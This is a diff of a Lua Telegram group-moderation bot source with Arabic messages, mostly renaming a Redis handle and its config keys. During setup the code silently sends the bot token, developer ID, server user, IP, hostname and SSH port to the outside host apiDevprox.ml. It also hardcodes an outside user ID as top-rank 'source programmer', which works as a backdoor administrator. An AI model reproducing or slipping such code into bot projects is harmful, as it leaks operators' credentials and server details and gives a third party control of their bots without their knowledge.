@@ -21,18 +21,18 @@ Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --     Source BRAND     --
 local AutoSet = function() 
-if not DevBRAND:get(Server.."IdBRAND") then 
+if not DevABS:get(Server.."IdDevProx") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevBRAND:set(Server.."IdBRAND",DevId) 
+DevABS:set(Server.."IdDevProx",DevId) 
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end 
 os.execute('lua BRAND.lua') 
 end 
-if not DevBRAND:get(Server.."TokenBRAND") then 
+if not DevABS:get(Server.."TokenBRAND") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
@@ -41,7 +41,7 @@ if res ~= 200 then
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-DevBRAND:set(Server.."TokenBRAND",TokenBot) 
+DevABS:set(Server.."TokenBRAND",TokenBot) 
 end  
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
@@ -61,18 +61,18 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = DevBRAND:get(Server.."IdBRAND"),
-TokenBot = DevBRAND:get(Server.."TokenBRAND"),
-BRAND = DevBRAND:get(Server.."TokenBRAND"):match("(%d+)"),
-SudoIds = {DevBRAND:get(Server.."IdBRAND")},
+DevId = DevABS:get(Server.."IdDevProx"),
+TokenBot = DevABS:get(Server.."TokenBRAND"),
+BRAND = DevABS:get(Server.."TokenBRAND"):match("(%d+)"),
+SudoIds = {DevABS:get(Server.."IdDevProx")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiDevprox.ml/config.php?Get=BRAND&DevId="..DevBRAND:get(Server.."IdBRAND").."&TokenBot="..DevBRAND:get(Server.."TokenBRAND").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiDevprox.ml/config.php?Get=BRAND&DevId="..DevABS:get(Server.."IdDevProx").."&TokenBot="..DevABS:get(Server.."TokenBRAND").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("BRAND.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/BRAND
-token="]]..DevBRAND:get(Server.."TokenBRAND")..[["
+token="]]..DevABS:get(Server.."TokenBRAND")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -107,18 +107,18 @@ os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
 end
-local Load_BRAND = function() 
+local Load_DevProx = function() 
 local f = io.open("./config.lua", "r") 
 if not f then 
 AutoSet() 
 else 
 f:close() 
-DevBRAND:del(Server.."IdBRAND");DevBRAND:del(Server.."TokenBRAND")
+DevABS:del(Server.."IdDevProx");DevABS:del(Server.."TokenBRAND")
 end 
 local config = loadfile("./config.lua")() 
 return config 
 end  
-Load_BRAND() 
+Load_DevProx() 
 print("\27[36m"..[[ 
 ---------------------------------------------
 |    ____             ____                  |
@@ -137,7 +137,7 @@ DevId = Config.DevId
 SudoIds = {Config.SudoIds,1566031059}
 BRAND = Config.BRAND
 TokenBot = Config.TokenBot
-NameBot = (DevBRAND:get(BRAND..'BRAND:NameBot') or 'بروكس')
+NameBot = (DevABS:get(BRAND..'BRAND:NameBot') or 'بروكس')
 --     Source BRAND     --
 FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
 FilesNumber = 0
@@ -186,7 +186,7 @@ end
 --     Source BRAND     --
 -------  SecondSudo  -------
 function SecondSudo(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:SecondSudo:',msg.sender_user_id_) 
 if Status or Sudo(msg) then  
 return true  
 else  
@@ -205,7 +205,7 @@ end
 --     Source BRAND     --
 ---------  SudoBot  --------
 function SudoBot(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:SudoBot:',msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:SudoBot:',msg.sender_user_id_) 
 if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -215,7 +215,7 @@ end
 --     Source BRAND     --
 ---------Manager All--------
 function ManagerAll(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:ManagerAll:',msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:ManagerAll:',msg.sender_user_id_) 
 if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -225,7 +225,7 @@ end
 --     Source BRAND     --
 --------- Admin All --------
 function AdminAll(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:AdminAll:',msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:AdminAll:',msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -235,7 +235,7 @@ end
 --     Source BRAND     --
 ------ Vip Member All ------
 function VipAll(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:VipAll:',msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:VipAll:',msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -245,7 +245,7 @@ end
 --     Source BRAND     --
 ----   BRANDConstructor   ----
 function BRANDConstructor(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -255,7 +255,7 @@ end
 --     Source BRAND     --
 ----  BasicConstructor  ----
 function BasicConstructor(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or BRANDConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -265,7 +265,7 @@ end
 --     Source BRAND     --
 ----    Constructor     ----
 function Constructor(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or BRANDConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -275,7 +275,7 @@ end
 --     Source BRAND     --
 ---------  Manager  --------
 function Manager(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:Managers:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:Managers:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or BRANDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -285,7 +285,7 @@ end
 --     Source BRAND     --
 ----------  Admin  ---------
 function Admin(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:Admins:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:Admins:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or BRANDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -295,7 +295,7 @@ end
 --     Source BRAND     --
 ---------Vip Member---------
 function VipMem(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or BRANDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -305,7 +305,7 @@ end
 --     Source BRAND     --
 --------- Cleaner ----------
 function Cleaner(msg) 
-local Status = DevBRAND:sismember(BRAND..'BRAND:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevABS:sismember(BRAND..'BRAND:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or BRANDConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
@@ -315,7 +315,7 @@ end
 --     Source BRAND     --
 ---------  Banned  ---------
 local function Ban(user_id, chat_id)
-if DevBRAND:sismember(BRAND..'BRAND:Ban:'..chat_id, user_id) then
+if DevABS:sismember(BRAND..'BRAND:Ban:'..chat_id, user_id) then
 var = true
 else
 var = false
@@ -325,7 +325,7 @@ end
 --     Source BRAND     --
 ---------  BanAll  ---------
 function BanAll(user_id)
-if DevBRAND:sismember(BRAND..'BRAND:BanAll:', user_id) then
+if DevABS:sismember(BRAND..'BRAND:BanAll:', user_id) then
 var = true
 else
 var = false
@@ -335,7 +335,7 @@ end
 --     Source BRAND     --
 ----------  Muted  ---------
 local function Muted(user_id, chat_id)
-if DevBRAND:sismember(BRAND..'BRAND:Muted:'..chat_id, user_id) then
+if DevABS:sismember(BRAND..'BRAND:Muted:'..chat_id, user_id) then
 var = true
 else
 var = false
@@ -345,7 +345,7 @@ end
 --     Source BRAND     --
 ---------  MuteAll  --------
 function MuteAll(user_id)
-if DevBRAND:sismember(BRAND..'BRAND:MuteAll:', user_id) then
+if DevABS:sismember(BRAND..'BRAND:MuteAll:', user_id) then
 var = true
 else
 var = false
@@ -411,60 +411,60 @@ end
 local info_file = io.open('./'..BRAND..'.json', "r"):read('*a')
 local JsonInfo = JSON.decode(info_file)
 vardump(JsonInfo)
-DevBRAND:set(BRAND.."BRAND:NameBot",JsonInfo.BotName) 
+DevABS:set(BRAND.."BRAND:NameBot",JsonInfo.BotName) 
 for IdGps,v in pairs(JsonInfo.GroupsList) do
-DevBRAND:sadd(BRAND.."BRAND:Groups",IdGps) 
-DevBRAND:set(BRAND.."BRAND:Lock:Bots"..IdGps,"del") DevBRAND:hset(BRAND.."BRAND:Spam:Group:User"..IdGps ,"Spam:User","keed") 
+DevABS:sadd(BRAND.."BRAND:Groups",IdGps) 
+DevABS:set(BRAND.."BRAND:Lock:Bots"..IdGps,"del") DevABS:hset(BRAND.."BRAND:Spam:Group:User"..IdGps ,"Spam:User","keed") 
 LockList ={'BRAND:Lock:Links','BRAND:Lock:Contact','BRAND:Lock:Forwards','BRAND:Lock:Videos','BRAND:Lock:Gifs','BRAND:Lock:EditMsgs','BRAND:Lock:Stickers','BRAND:Lock:Farsi','BRAND:Lock:Spam','BRAND:Lock:WebLinks','BRAND:Lock:Photo'}
 for i,Lock in pairs(LockList) do
-DevBRAND:set(BRAND..Lock..IdGps,true)
+DevABS:set(BRAND..Lock..IdGps,true)
 end
 if v.BRANDConstructors then
-for k,IdBRANDConstructors in pairs(v.BRANDConstructors) do
-DevBRAND:sadd(BRAND..'BRAND:BRANDConstructor:'..IdGps,IdBRANDConstructors)  
+for k,IdDevProxConstructors in pairs(v.BRANDConstructors) do
+DevABS:sadd(BRAND..'BRAND:BRANDConstructor:'..IdGps,IdDevProxConstructors)  
 print('تم رفع منشئين المجموعات')
 end
 end
 if v.BasicConstructors then
 for k,IdBasicConstructors in pairs(v.BasicConstructors) do
-DevBRAND:sadd(BRAND..'BRAND:BasicConstructor:'..IdGps,IdBasicConstructors)  
+DevABS:sadd(BRAND..'BRAND:BasicConstructor:'..IdGps,IdBasicConstructors)  
 print('تم رفع ( '..k..' ) منشئين اساسيين')
 end
 end
 if v.Constructors then
 for k,IdConstructors in pairs(v.Constructors) do
-DevBRAND:sadd(BRAND..'BRAND:Constructor:'..IdGps,IdConstructors)  
+DevABS:sadd(BRAND..'BRAND:Constructor:'..IdGps,IdConstructors)  
 print('تم رفع ( '..k..' ) منشئين')
 end
 end
 if v.Managers then
 for k,IdManagers in pairs(v.Managers) do
-DevBRAND:sadd(BRAND..'BRAND:Managers:'..IdGps,IdManagers)  
+DevABS:sadd(BRAND..'BRAND:Managers:'..IdGps,IdManagers)  
 print('تم رفع ( '..k..' ) مدراء')
 end
 end
 if v.Admins then
 for k,idmod in pairs(v.Admins) do
 vardump(IdAdmins)
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..IdGps,IdAdmins)  
+DevABS:sadd(BRAND..'BRAND:Admins:'..IdGps,IdAdmins)  
 print('تم رفع ( '..k..' ) ادمنيه')
 end
 end
 if v.Vips then
 for k,IdVips in pairs(v.Vips) do
-DevBRAND:sadd(BRAND..'BRAND:VipMem:'..IdGps,IdVips)  
+DevABS:sadd(BRAND..'BRAND:VipMem:'..IdGps,IdVips)  
 print('تم رفع ( '..k..' ) مميزين')
 end
 end
 if v.LinkGroups then
 if v.LinkGroups ~= "" then
-DevBRAND:set(BRAND.."BRAND:Groups:Links"..IdGps,v.LinkGroups)   
+DevABS:set(BRAND.."BRAND:Groups:Links"..IdGps,v.LinkGroups)   
 print('( تم وضع روابط المجموعات )')
 end
 end
 if v.Welcomes then
 if v.Welcomes ~= "" then
-DevBRAND:set(BRAND.."BRAND:Groups:Welcomes"..IdGps,v.Welcomes)   
+DevABS:set(BRAND.."BRAND:Groups:Welcomes"..IdGps,v.Welcomes)   
 print('( تم وضع ترحيب المجموعات )')
 end
 end
@@ -596,34 +596,34 @@ end ,nil)
 end
 --     Source BRAND     --
 local BRANDRank = function(msg) if SudoId(msg.sender_user_id_) then BRANDTTEAM  = "المطور" elseif SecondSudo(msg) then BRANDTTEAM = "المطور" elseif SudoBot(msg) then BRANDTTEAM = "المطور" elseif ManagerAll(msg) then BRANDTTEAM = "المدير" elseif AdminAll(msg) then BRANDTTEAM = "الادمن" elseif BRANDConstructor(msg) then BRANDTTEAM = "المالك" elseif BasicConstructor(msg) then BRANDTTEAM = "المنشئ" elseif Constructor(msg) then BRANDTTEAM = "المنشئ" elseif Manager(msg) then BRANDTTEAM = "المدير" elseif Admin(msg) then BRANDTTEAM = "الادمن" else BRANDTTEAM = "العضو" end return BRANDTTEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1566031059) then BRANDTTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(BRAND) then BRANDTTEAM = 'البوت' elseif SudoId(user_id) then BRANDTTEAM = 'المطور الاساسي' elseif DevBRAND:sismember(BRAND..'BRAND:SecondSudo:', user_id) then BRANDTTEAM = 'المطور الثانوي' elseif DevBRAND:sismember(BRAND..'BRAND:SudoBot:', user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:SudoBot:Rd"..chat_id) or 'المطور' elseif DevBRAND:sismember(BRAND..'BRAND:ManagerAll:', user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:Managers:Rd"..chat_id) or 'المدير العام' elseif DevBRAND:sismember(BRAND..'BRAND:AdminAll:', user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevBRAND:sismember(BRAND..'BRAND:VipAll:', user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevBRAND:sismember(BRAND..'BRAND:BRANDConstructor:'..chat_id, user_id) then BRANDTTEAM = 'المالك' elseif DevBRAND:sismember(BRAND..'BRAND:BasicConstructor:'..chat_id, user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevBRAND:sismember(BRAND..'BRAND:Constructor:'..chat_id, user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevBRAND:sismember(BRAND..'BRAND:Managers:'..chat_id, user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:Managers:Rd"..chat_id) or 'المدير' elseif DevBRAND:sismember(BRAND..'BRAND:Admins:'..chat_id, user_id) then BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:Admins:Rd"..chat_id) or 'الادمن' elseif DevBRAND:sismember(BRAND..'BRAND:VipMem:'..chat_id, user_id) then  BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:VipMem:Rd"..chat_id) or 'المميز' elseif DevBRAND:sismember(BRAND..'BRAND:Cleaner:'..chat_id, user_id) then  BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:Cleaner:Rd"..chat_id) or 'المنظف' else BRANDTTEAM = DevBRAND:get(BRAND.."BRAND:mem:Rd"..chat_id) or 'العضو' end return BRANDTTEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1566031059) then BRANDTTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(BRAND) then BRANDTTEAM = 'البوت' elseif SudoId(user_id) then BRANDTTEAM = 'المطور الاساسي' elseif DevABS:sismember(BRAND..'BRAND:SecondSudo:', user_id) then BRANDTTEAM = 'المطور الثانوي' elseif DevABS:sismember(BRAND..'BRAND:SudoBot:', user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:SudoBot:Rd"..chat_id) or 'المطور' elseif DevABS:sismember(BRAND..'BRAND:ManagerAll:', user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:Managers:Rd"..chat_id) or 'المدير العام' elseif DevABS:sismember(BRAND..'BRAND:AdminAll:', user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevABS:sismember(BRAND..'BRAND:VipAll:', user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevABS:sismember(BRAND..'BRAND:BRANDConstructor:'..chat_id, user_id) then BRANDTTEAM = 'المالك' elseif DevABS:sismember(BRAND..'BRAND:BasicConstructor:'..chat_id, user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevABS:sismember(BRAND..'BRAND:Constructor:'..chat_id, user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevABS:sismember(BRAND..'BRAND:Managers:'..chat_id, user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:Managers:Rd"..chat_id) or 'المدير' elseif DevABS:sismember(BRAND..'BRAND:Admins:'..chat_id, user_id) then BRANDTTEAM = DevABS:get(BRAND.."BRAND:Admins:Rd"..chat_id) or 'الادمن' elseif DevABS:sismember(BRAND..'BRAND:VipMem:'..chat_id, user_id) then  BRANDTTEAM = DevABS:get(BRAND.."BRAND:VipMem:Rd"..chat_id) or 'المميز' elseif DevABS:sismember(BRAND..'BRAND:Cleaner:'..chat_id, user_id) then  BRANDTTEAM = DevABS:get(BRAND.."BRAND:Cleaner:Rd"..chat_id) or 'المنظف' else BRANDTTEAM = DevABS:get(BRAND.."BRAND:mem:Rd"..chat_id) or 'العضو' end return BRANDTTEAM end
 --     Source BRAND     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
 var = true  
 elseif tonumber(user_id) == tonumber(BRAND) then  
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:SecondSudo:', user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:SecondSudo:', user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:SudoBot:', user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:SudoBot:', user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:ManagerAll:', user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:ManagerAll:', user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:AdminAll:', user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:AdminAll:', user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:VipAll:', user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:VipAll:', user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:BRANDConstructor:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:BRANDConstructor:'..chat_id, user_id) then
 var = true
-elseif DevBRAND:sismember(BRAND..'BRAND:BasicConstructor:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:BasicConstructor:'..chat_id, user_id) then
 var = true
-elseif DevBRAND:sismember(BRAND..'BRAND:Constructor:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:Constructor:'..chat_id, user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:Managers:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:Managers:'..chat_id, user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:Admins:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:Admins:'..chat_id, user_id) then
 var = true  
-elseif DevBRAND:sismember(BRAND..'BRAND:VipMem:'..chat_id, user_id) then  
+elseif DevABS:sismember(BRAND..'BRAND:VipMem:'..chat_id, user_id) then  
 var = true 
 else  
 var = false
@@ -633,17 +633,17 @@ end
 function BRANDDelAll(user_id,chat_id)
 if SudoId(user_id) then
 var = 'sudoid'  
-elseif DevBRAND:sismember(BRAND..'BRAND:SecondSudo:', user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:SecondSudo:', user_id) then
 var = 'secondsudo' 
-elseif DevBRAND:sismember(BRAND..'BRAND:SudoBot:', user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:SudoBot:', user_id) then
 var = 'sudobot'  
-elseif DevBRAND:sismember(BRAND..'BRAND:BRANDConstructor:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:BRANDConstructor:'..chat_id, user_id) then
 var = 'BRANDconstructor'
-elseif DevBRAND:sismember(BRAND..'BRAND:BasicConstructor:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:BasicConstructor:'..chat_id, user_id) then
 var = 'basicconstructor'
-elseif DevBRAND:sismember(BRAND..'BRAND:Constructor:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:Constructor:'..chat_id, user_id) then
 var = 'constructor'
-elseif DevBRAND:sismember(BRAND..'BRAND:Managers:'..chat_id, user_id) then
+elseif DevABS:sismember(BRAND..'BRAND:Managers:'..chat_id, user_id) then
 var = 'manager'  
 else  
 var = 'No'
@@ -654,7 +654,7 @@ end
 local function Filters(msg, value)
 local BRAND = (BRAND..'BRAND:Filters:'..msg.chat_id_)
 if BRAND then
-local names = DevBRAND:hkeys(BRAND)
+local names = DevABS:hkeys(BRAND)
 local value = value:gsub(' ','')
 for i=1, #names do
 if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
@@ -798,7 +798,7 @@ end
 return MsgText
 end
 --     Source BRAND     --
-function BRANDmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevBRAND:get(BRAND..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
+function BRANDmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevABS:get(BRAND..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
 --     Source BRAND     --
 function SourceCh(msg) 
 local url,res = https.request('https://apiDevprox.ml/SourceCh.php?id='..msg.sender_user_id_)
@@ -816,16 +816,16 @@ return Var
 end
 function ChCheck(msg)
 local var = true 
-if DevBRAND:get(BRAND.."BRAND:ChId") then
-local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevBRAND:get(BRAND..'BRAND:ChId')..'&user_id='..msg.sender_user_id_)
+if DevABS:get(BRAND.."BRAND:ChId") then
+local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevABS:get(BRAND..'BRAND:ChId')..'&user_id='..msg.sender_user_id_)
 local data = json:decode(url)
 if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
 var = false 
-if DevBRAND:get(BRAND..'BRAND:ChText') then
-local ChText = DevBRAND:get(BRAND..'BRAND:ChText')
+if DevABS:get(BRAND..'BRAND:ChText') then
+local ChText = DevABS:get(BRAND..'BRAND:ChText')
 send(msg.chat_id_,msg.id_,'['..ChText..']')
 else
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevBRAND:get(BRAND.."BRAND:ChId"))
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevABS:get(BRAND.."BRAND:ChId"))
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.username then
 User = "https://t.me/"..GetInfo.result.username
@@ -851,9 +851,9 @@ local Chat_Id2 = data.chat_id_
 local MsgId2 = data.message_id_
 local DataText = data.payload_.data_
 local Msg_Id2 = data.message_id_/2097152/0.5
-if DataText == '/delyes' and DevBRAND:get(BRAND..'yes'..data.sender_user_id_) == 'delyes' then
-DevBRAND:del(BRAND..'yes'..data.sender_user_id_, 'delyes')
-DevBRAND:del(BRAND..'no'..data.sender_user_id_, 'delno')
+if DataText == '/delyes' and DevABS:get(BRAND..'yes'..data.sender_user_id_) == 'delyes' then
+DevABS:del(BRAND..'yes'..data.sender_user_id_, 'delyes')
+DevABS:del(BRAND..'no'..data.sender_user_id_, 'delno')
 if RankChecking(data.sender_user_id_, data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
 return false
@@ -878,34 +878,34 @@ return false
 end
 end,nil)  
 end
-if DataText == '/delno' and DevBRAND:get(BRAND..'no'..data.sender_user_id_) == 'delno' then
-DevBRAND:del(BRAND..'yes'..data.sender_user_id_, 'delyes')
-DevBRAND:del(BRAND..'no'..data.sender_user_id_, 'delno')
+if DataText == '/delno' and DevABS:get(BRAND..'no'..data.sender_user_id_) == 'delno' then
+DevABS:del(BRAND..'yes'..data.sender_user_id_, 'delyes')
+DevABS:del(BRAND..'no'..data.sender_user_id_, 'delno')
 EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر اطردني") 
 end
 --     Source BRAND     --
-if DataText == '/yesdel' and DevBRAND:get(BRAND..'yesdel'..data.sender_user_id_) == 'delyes' then
-DevBRAND:del(BRAND..'yesdel'..data.sender_user_id_, 'delyes')
-DevBRAND:del(BRAND..'nodel'..data.sender_user_id_, 'delno')
-if DevBRAND:sismember(BRAND..'BRAND:Constructor:'..data.chat_id_, data.sender_user_id_) then
+if DataText == '/yesdel' and DevABS:get(BRAND..'yesdel'..data.sender_user_id_) == 'delyes' then
+DevABS:del(BRAND..'yesdel'..data.sender_user_id_, 'delyes')
+DevABS:del(BRAND..'nodel'..data.sender_user_id_, 'delno')
+if DevABS:sismember(BRAND..'BRAND:Constructor:'..data.chat_id_, data.sender_user_id_) then
 constructor = 'المنشئين • ' else constructor = '' end 
-if DevBRAND:sismember(BRAND..'BRAND:Managers:'..data.chat_id_, data.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Managers:'..data.chat_id_, data.sender_user_id_) then
 Managers = 'المدراء • ' else Managers = '' end
